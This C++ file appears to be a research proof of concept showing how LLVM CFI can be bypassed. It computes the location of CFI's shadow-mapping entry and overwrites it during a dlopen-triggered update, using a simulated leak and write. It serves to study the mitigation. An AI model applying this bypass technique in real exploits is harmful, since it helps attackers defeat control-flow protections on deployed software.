#include <cstdint>
#include <cstring>
#include <signal.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <thread>
#include <iostream>

#define THREAD_NO 64
static constexpr uintptr_t SIZE = 0x001000000000;
static constexpr uintptr_t DISTANCE = 0x1000801000;
static constexpr uintptr_t kShadowGranularity = 12;

int foo(int x);
int foo(int x) {
    return 44 * x;
}

float target_func() {
    std::cout << "this should not have happened." << std::endl;
    exit(0);
}

void thread_func(uintptr_t target) {
    // Simulate vulnerability to overwrite shadow mapping entry
    // One can comment out this line to check that without it,
    // CFI is preventing the call to target_func.
    *reinterpret_cast<uintptr_t*>(target) = 0xffffffffffffffff;
}

int main() {
    // Simulate leak of allocation address
    uintptr_t alloc = reinterpret_cast<uintptr_t>(
        mmap(nullptr,
             SIZE, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANON | MAP_NORESERVE, 0, 0));
    std::cout << "Allocation at: "
              << std::hex << alloc << std::endl;

    // Calculate the address where the mapping entry for
    // target_func is located
    uintptr_t target = (alloc + ((reinterpret_cast<uintptr_t>(&target_func) >> kShadowGranularity) << 1) - DISTANCE);
    std::cout << "Target at: " << std::hex << target << std::endl
              << "Shadow base at: "
              << std::hex << (alloc - DISTANCE) << std::endl;

    // Start a thread to overwrite the target,
    // and trigger shadow mapping update
    std::thread t = std::thread(thread_func, target);
    // The .so file is arbitrary
    void *handle = dlopen("/usr/lib/p7zip/7z.so", 0);
    t.join();   

    // Simulate an arbitrary write to redirect the
    // function pointer to the target_function
    int (*func_ptr)(int) = foo;
    func_ptr = reinterpret_cast<int (*)(int)>(&target_func);
    func_ptr(5);  // This call should fail under LLVM CFI
}
